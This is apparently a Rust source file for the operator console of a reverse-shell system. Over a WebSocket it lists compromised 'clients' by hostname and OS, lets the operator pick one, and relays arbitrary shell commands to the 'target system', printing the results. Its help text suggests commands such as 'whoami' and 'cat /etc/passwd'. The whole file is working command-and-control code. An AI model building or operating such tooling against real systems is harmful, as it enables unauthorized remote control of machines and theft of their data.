use crate::types::*;
use anyhow::{anyhow, Result};
use chrono::Utc;
use futures_util::{SinkExt, StreamExt};
use std::io::{self, Write};
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio_tungstenite::{connect_async, tungstenite::Message as WsMessage};
use tracing::{debug, error, info, warn};
use url::Url;

pub struct ReverseShellCli {
    server_url: String,
    admin_token: String,
    use_ssl: bool,
}

impl ReverseShellCli {
    pub fn new(server_url: String, admin_token: String, use_ssl: bool) -> Self {
        Self {
            server_url,
            admin_token,
            use_ssl,
        }
    }

    pub async fn start(&self) -> Result<()> {
        info!("Starting reverse shell CLI");
        info!("Server URL: {}", self.server_url);

        let url = if self.use_ssl {
            format!("wss://{}", self.server_url)
        } else {
            format!("ws://{}", self.server_url)
        };

        info!("Connecting to: {}", url);
        let url = Url::parse(&url)?;
        let (ws_stream, _) = connect_async(url).await?;
        let (mut ws_sender, mut ws_receiver) = ws_stream.split();

        info!("Connected to server");

        // Get list of clients
        let clients = self
            .get_client_list(&mut ws_sender, &mut ws_receiver)
            .await?;

        if clients.is_empty() {
            println!("No clients connected to the server.");
            return Ok(());
        }

        // Display clients and let user choose
        let selected_client = self.select_client(&clients)?;

        // Connect to selected client
        let session_id = self
            .connect_to_client(&mut ws_sender, &mut ws_receiver, selected_client.id)
            .await?;

        // Start interactive shell session
        self.interactive_shell_session(&mut ws_sender, &mut ws_receiver, session_id)
            .await?;

        Ok(())
    }

    async fn get_client_list(
        &self,
        ws_sender: &mut futures_util::stream::SplitSink<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
            WsMessage,
        >,
        ws_receiver: &mut futures_util::stream::SplitStream<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
        >,
    ) -> Result<Vec<ClientInfo>> {
        let request = Message::ClientListRequest(ClientListRequest {
            admin_token: self.admin_token.clone(),
        });

        let request_json = serde_json::to_string(&request)?;
        ws_sender.send(WsMessage::Text(request_json)).await?;

        while let Some(msg) = ws_receiver.next().await {
            match msg {
                Ok(WsMessage::Text(text)) => match serde_json::from_str::<Message>(&text) {
                    Ok(Message::ClientListResponse(response)) => {
                        return Ok(response.clients);
                    }
                    Ok(Message::Error { message }) => {
                        return Err(anyhow!("Server error: {}", message));
                    }
                    _ => {
                        debug!("Unexpected message while getting client list");
                    }
                },
                Ok(WsMessage::Close(_)) => {
                    return Err(anyhow!("Connection closed"));
                }
                Err(e) => {
                    return Err(anyhow!("WebSocket error: {}", e));
                }
                _ => {}
            }
        }

        Err(anyhow!("Failed to get client list"))
    }

    fn select_client<'a>(&self, clients: &'a [ClientInfo]) -> Result<&'a ClientInfo> {
        println!("\n=== Connected Clients ===");
        for (index, client) in clients.iter().enumerate() {
            let duration = Utc::now().signed_duration_since(client.connected_at);
            let duration_str = if duration.num_hours() > 0 {
                format!("{}h {}m", duration.num_hours(), duration.num_minutes() % 60)
            } else {
                format!("{}m", duration.num_minutes())
            };

            println!(
                "[{}] {} ({}) - {} {} - Connected: {}",
                index + 1,
                client.hostname,
                client.id,
                client.os,
                client.arch,
                duration_str
            );
        }

        loop {
            print!("\nSelect client (number or ID): ");
            io::stdout().flush()?;

            let mut input = String::new();
            io::stdin().read_line(&mut input)?;
            let input = input.trim();

            // Try to parse as number first
            if let Ok(index) = input.parse::<usize>() {
                if index > 0 && index <= clients.len() {
                    return Ok(&clients[index - 1]);
                } else {
                    println!(
                        "Invalid index. Please enter a number between 1 and {}",
                        clients.len()
                    );
                    continue;
                }
            }

            // Try to parse as UUID
            if let Ok(uuid) = input.parse::<Uuid>() {
                if let Some(client) = clients.iter().find(|c| c.id == uuid) {
                    return Ok(client);
                } else {
                    println!("Client with ID {} not found", uuid);
                    continue;
                }
            }

            println!("Invalid input. Please enter a number or UUID");
        }
    }

    async fn connect_to_client(
        &self,
        ws_sender: &mut futures_util::stream::SplitSink<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
            WsMessage,
        >,
        ws_receiver: &mut futures_util::stream::SplitStream<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
        >,
        client_id: Uuid,
    ) -> Result<Uuid> {
        let request = Message::ConnectToClientRequest(ConnectToClientRequest {
            admin_token: self.admin_token.clone(),
            client_id,
        });

        let request_json = serde_json::to_string(&request)?;
        ws_sender.send(WsMessage::Text(request_json)).await?;

        while let Some(msg) = ws_receiver.next().await {
            match msg {
                Ok(WsMessage::Text(text)) => match serde_json::from_str::<Message>(&text) {
                    Ok(Message::ConnectToClientResponse(response)) => {
                        if response.success {
                            if let Some(session_id) = response.session_id {
                                info!("Connected to client successfully");
                                return Ok(session_id);
                            } else {
                                return Err(anyhow!("No session ID provided"));
                            }
                        } else {
                            return Err(anyhow!(
                                "Failed to connect to client: {}",
                                response.message
                            ));
                        }
                    }
                    Ok(Message::Error { message }) => {
                        return Err(anyhow!("Server error: {}", message));
                    }
                    _ => {
                        debug!("Unexpected message while connecting to client");
                    }
                },
                Ok(WsMessage::Close(_)) => {
                    return Err(anyhow!("Connection closed"));
                }
                Err(e) => {
                    return Err(anyhow!("WebSocket error: {}", e));
                }
                _ => {}
            }
        }

        Err(anyhow!("Failed to connect to client"))
    }

    async fn interactive_shell_session(
        &self,
        ws_sender: &mut futures_util::stream::SplitSink<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
            WsMessage,
        >,
        ws_receiver: &mut futures_util::stream::SplitStream<
            tokio_tungstenite::WebSocketStream<
                tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>,
            >,
        >,
        session_id: Uuid,
    ) -> Result<()> {
        println!("\n=== Interactive Shell Session ===");
        println!("Type 'exit' or 'quit' to end the session");
        println!("Type 'help' for available commands\n");

        let stdin = tokio::io::stdin();
        let mut stdin_reader = BufReader::new(stdin);

        loop {
            print!("shell> ");
            io::stdout().flush()?;

            let mut command = String::new();

            tokio::select! {
                // Handle user input
                result = stdin_reader.read_line(&mut command) => {
                    match result {
                        Ok(0) => break, // EOF
                        Ok(_) => {
                            let command = command.trim();

                            if command.is_empty() {
                                continue;
                            }

                            if command == "exit" || command == "quit" {
                                println!("Ending session...");
                                break;
                            }

                            if command == "help" {
                                self.show_help();
                                continue;
                            }

                            // Send command to client
                            let shell_command = Message::ShellCommand(ShellCommand {
                                command: command.to_string(),
                                session_id,
                            });

                            let command_json = serde_json::to_string(&shell_command)?;
                            if let Err(e) = ws_sender.send(WsMessage::Text(command_json)).await {
                                error!("Failed to send command: {}", e);
                                break;
                            }
                        }
                        Err(e) => {
                            error!("Error reading input: {}", e);
                            break;
                        }
                    }
                }

                // Handle server responses
                msg = ws_receiver.next() => {
                    match msg {
                        Some(Ok(WsMessage::Text(text))) => {
                            match serde_json::from_str::<Message>(&text) {
                                Ok(Message::ShellResponse(response)) => {
                                    if response.session_id == session_id {
                                        print!("{}", response.output);
                                        if response.exit_code != 0 {
                                            println!("[Exit code: {}]", response.exit_code);
                                        }
                                        print!("shell> ");
                                        io::stdout().flush()?;
                                    }
                                }
                                Ok(Message::Error { message }) => {
                                    println!("Error: {}", message);
                                }
                                _ => {
                                    debug!("Unexpected message during shell session");
                                }
                            }
                        }
                        Some(Ok(WsMessage::Close(_))) => {
                            println!("Connection closed by server");
                            break;
                        }
                        Some(Err(e)) => {
                            error!("WebSocket error: {}", e);
                            break;
                        }
                        None => {
                            warn!("Connection ended");
                            break;
                        }
                        _ => {}
                    }
                }
            }
        }

        Ok(())
    }

    fn show_help(&self) {
        println!("\n=== Available Commands ===");
        println!("help     - Show this help message");
        println!("exit     - End the shell session");
        println!("quit     - End the shell session");
        println!("\nYou can run any shell command available on the target system.");
        println!("Examples:");
        println!("  ls -la");
        println!("  ps aux");
        println!("  whoami");
        println!("  pwd");
        println!("  cat /etc/passwd");
        println!();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cli_creation() {
        let cli = ReverseShellCli::new(
            "localhost:8081".to_string(),
            "admin_token_456".to_string(),
            false,
        );
        assert_eq!(cli.server_url, "localhost:8081");
        assert_eq!(cli.admin_token, "admin_token_456");
        assert!(!cli.use_ssl);
    }

    #[test]
    fn test_select_client_with_valid_clients() {
        let _cli = ReverseShellCli::new(
            "localhost:8081".to_string(),
            "admin_token_456".to_string(),
            false,
        );

        let clients = [ClientInfo {
            id: Uuid::new_v4(),
            hostname: "test-host".to_string(),
            os: "Linux".to_string(),
            arch: "x86_64".to_string(),
            uptime: 12345,
            connected_at: Utc::now(),
            last_seen: Utc::now(),
        }];

        // This test would require mocking stdin, so we'll just verify the structure
        assert_eq!(clients.len(), 1);
        assert_eq!(clients[0].hostname, "test-host");
    }
}
